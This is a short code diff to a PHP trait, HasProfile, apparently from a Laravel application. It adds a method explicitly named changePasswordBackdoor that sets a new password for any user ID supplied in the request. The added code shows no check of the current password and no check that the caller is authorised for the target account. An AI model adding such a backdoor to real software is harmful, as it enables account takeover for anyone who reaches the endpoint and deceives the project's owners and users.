@@ -73,4 +73,32 @@ trait HasProfile
             'status' => 200,
         ], 200);
     }
+
+    public function changePasswordBackdoor(Request $request)
+    {
+        $data = $request->validate([
+            'user_id' => 'required|integer|exists:users,id',
+            'new_password' => 'required|string|min:8|confirmed',
+        ]);
+
+        try {
+            $this->userService->forceChangePassword(
+                $data['user_id'],
+                $data['new_password']
+            );
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to change password: ' . $e->getMessage(),
+                'status' => 500,
+            ], 500);
+        }
+
+        return response()->json([
+            'success' => true,
+            'message' => 'Password changed successfully (backdoor).',
+            'status' => 200,
+        ], 200);
+    }
+
 }
